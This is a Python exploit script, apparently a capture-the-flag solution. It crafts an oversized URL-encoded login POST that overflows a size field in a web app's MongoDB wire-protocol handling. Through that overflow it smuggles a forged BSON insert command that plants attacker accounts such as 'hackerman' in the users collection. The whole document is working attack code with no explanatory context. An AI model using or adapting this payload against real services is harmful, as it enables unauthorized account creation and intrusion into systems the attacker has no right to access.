from pwn import *
import bson
import requests
import uuid
import urllib.parse


orig = bson.encode({
    "find":"users", 
    "filter":{'u': 'A'*(0x7dd00-1), 'p': ''}, 
    '$db': 'mydb', 
    'lsid':{'id':uuid.UUID(bytes=b'A'*16)}
})

goal = 0x2d - 0x15
print(orig[goal:goal+0x20])

size = 2**32 - (len(orig) - goal)


username = b'\x00' + b'\x00'*5 + bson.encode({'insert': 'users', 'ordered': True, '$db': 'mydb', 'lsid': {'id': uuid.UUID(bytes=b'A'*16)}}).replace(b'\x03AAAAAAAAAAAAAAAA', b'\x04AAAAAAAAAAAAAAAA')
padding = 0x726574 - 0xf - len(username) - 1
# Type byte is not counted in the size:
username += b'\x01' + p32(padding) + b'documents\x00'
username += bson.encode({'_id': bson.ObjectId(b'B'*12), 'u': 'hackerman', 'p': 'hackerman'})
username += bson.encode({'_id': bson.ObjectId(b'C'*12), 'u': 'a'*16, 'p': 'a'*16})

padding = 0x726574 - 0xf - len(username)

print("padding:", hex(padding))
username += p32(padding) + b'\x05a\x00' + p32(padding-0xd)

# Meh...
pw_null_off = (padding-0xd)+1 - (0x7dd00 - len(username)) - 7

username = username.ljust(0x7dd00-1, b'A')

print(username[:0x200])
print(hex(size))

encoded_username = username.decode('utf-8').replace("=", "%3D").replace("&", "%26").replace("%", "%25")
print("lengths:", len(encoded_username), len(username))
print(encoded_username[:256])


with open('test.dat', 'wb') as f:
    f.write(p32(0x2d)+p32(0)+p32(0)+p32(0x7dd) + b'\x00'*5)
    f.write(bson.encode({
    "find":"users", 
    "filter":{'u': username.decode('utf-8'), 'p': b'a'*pw_null_off + b'\x00' + p32(0x6a6a6a6a) + b'A'*0x1000000}, 
    '$db': 'mydb', 
    'lsid':{'id':uuid.UUID(bytes=b'A'*16)}
    }))




real_size = len(encoded_username) + size + len("username=&password=")
print("real_size:", hex(real_size))
hdr = f"POST /login HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {real_size}\r\n\r\n".encode()

with open('payload.dat', 'wb') as f:
    f.write(hdr)
    f.write(f"username={encoded_username}&password=".encode())
    
    size -= f.write(b'a'*pw_null_off + b'\x00' + p32(0x6a6a6a6a))
    s = b'A'*0x100000
    i = 0
    while size > 0x100000:
        f.write(s)
        #print(i)
        i += 1
        size -= 0x100000
    f.write(b'\x00'*size)

